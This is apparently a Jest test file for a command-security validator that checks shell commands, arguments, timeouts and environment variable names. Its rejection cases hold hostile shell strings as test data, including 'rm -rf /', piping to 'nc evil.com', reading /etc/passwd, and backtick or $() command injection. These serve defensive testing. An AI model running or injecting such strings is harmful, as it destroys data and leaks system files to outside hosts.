import { SecurityValidator } from '../../src/security/validator';

describe('SecurityValidator', () => {
  describe('validateCommand', () => {
    it('should accept safe commands', () => {
      const result = SecurityValidator.validateCommand('echo hello');
      expect(result.valid).toBe(true);
    });

    it('should reject commands with dangerous characters', () => {
      const commands = [
        'echo hello; rm -rf /',
        'echo hello && rm file',
        'echo hello | nc evil.com 1234',
        'echo hello `cat /etc/passwd`',
        'echo hello $(rm file)',
      ];

      commands.forEach(cmd => {
        const result = SecurityValidator.validateCommand(cmd);
        expect(result.valid).toBe(false);
      });
    });

    it('should reject commands with directory traversal', () => {
      const result = SecurityValidator.validateCommand('cat ../../etc/passwd');
      expect(result.valid).toBe(false);
    });

    it('should reject empty or invalid commands', () => {
      expect(SecurityValidator.validateCommand('').valid).toBe(false);
      expect(SecurityValidator.validateCommand(null as any).valid).toBe(false);
    });
  });

  describe('validateArgument', () => {
    it('should accept safe arguments', () => {
      const args = ['hello', 'world', '123', 'file.txt', '/path/to/file'];
      
      args.forEach(arg => {
        const result = SecurityValidator.validateArgument(arg);
        expect(result.valid).toBe(true);
      });
    });

    it('should reject arguments with dangerous characters', () => {
      const args = [
        'hello; rm -rf /',
        'hello && echo bad',
        'hello | nc evil.com',
        'hello`whoami`',
      ];

      args.forEach(arg => {
        const result = SecurityValidator.validateArgument(arg);
        expect(result.valid).toBe(false);
      });
    });

    it('should reject arguments with null bytes', () => {
      const result = SecurityValidator.validateArgument('hello\0world');
      expect(result.valid).toBe(false);
    });
  });

  describe('validateTimeout', () => {
    it('should accept valid timeouts', () => {
      expect(SecurityValidator.validateTimeout(1000).valid).toBe(true);
      expect(SecurityValidator.validateTimeout(30000).valid).toBe(true);
    });

    it('should reject invalid timeouts', () => {
      expect(SecurityValidator.validateTimeout(0).valid).toBe(false);
      expect(SecurityValidator.validateTimeout(-1000).valid).toBe(false);
      expect(SecurityValidator.validateTimeout(500000).valid).toBe(false);
    });
  });

  describe('sanitizeEnvironmentVariables', () => {
    it('should sanitize environment variables', () => {
      const env = {
        'VALID_VAR': 'safe_value',
        'invalid-var': 'value',
        'ANOTHER_VALID': 'another_value',
        'bad;var': 'value',
      };

      const sanitized = SecurityValidator.sanitizeEnvironmentVariables(env);
      
      expect(sanitized).toHaveProperty('VALID_VAR');
      expect(sanitized).toHaveProperty('ANOTHER_VALID');
      expect(sanitized).not.toHaveProperty('invalid-var');
      expect(sanitized).not.toHaveProperty('bad;var');
    });
  });
});